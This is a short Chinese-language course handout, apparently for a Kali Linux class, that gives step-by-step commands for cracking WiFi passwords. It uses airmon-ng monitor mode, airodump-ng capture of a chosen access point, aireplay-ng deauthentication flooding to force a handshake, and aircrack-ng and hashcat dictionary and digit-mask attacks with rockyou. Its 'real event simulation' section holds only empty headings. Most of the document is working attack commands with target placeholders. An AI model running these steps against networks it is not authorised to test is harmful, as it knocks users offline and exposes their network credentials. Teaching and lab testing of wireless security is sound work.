# WIFI爆破步驟

## 虛擬機下載位置：https://drive.google.com/file/d/1QVfqqFYD0UshPDLOWhap2U1BUiZVod5N/view?usp=drive_link

## 1. 啟用網卡
```
ip a
可查看kali目前所有成功運作的網卡
```

```
iw list | grep -A 10 "Supported interface modes"
可察看網卡支援甚麼模式(此課程需monitor)
```

## 2. 開啟monitor模式
```
sudo airmon-ng check kill
關掉會影響工具的服務
```

```
sudo airmon-ng start wlan0
啟用monitor模式
```



---
### 上述步驟已在課程前處理好
---

## 3. 掃描附近網路，決定目標
```
sudo airodump-ng wlan0
請紀錄目標bssid、ch
```

## 4. 選定目標，監聽目標與旗下設備的通訊訊息(數據包)
```
sudo airodump-ng -w wificapture -c <channel> --bssid <bssid> wlan0
<>內容請換成自己目標的
```

## 5. 強制重連，抓取連線時密碼驗證的數據包
```
sudo aireplay-ng --deauth 0 -a <bssid> wlan0
發送重連封包給旗下設備
```

## 6. 成功監聽到密碼數據包，進行爆破
```
aircrack-ng file.cap -w /usr/share/wordlists/rockyou.txt
工具內建的字典爆破
```

## 7. 使用hashcat，進行數字爆破、字典爆破
hashcat支持gpu，爆破速度比較快
```
hashcat -m 22000 output.hc22000 /usr/share/wordlists/rockyou.txt --status --force --potfile-disable
字典爆破


hashcat -m 22000 -a 3 output.hc22000 ?d?d?d?d?d?d?d?d?d?d  --status   --force --potfile-disable
數字爆破(掩碼攻擊)
```

## 8. hashcat gpu爆破速度展示

# 真實事件模擬

## 1. 純for爆破

## 2. 字典爆破

## 3. 字典爆破+驗證碼爆破
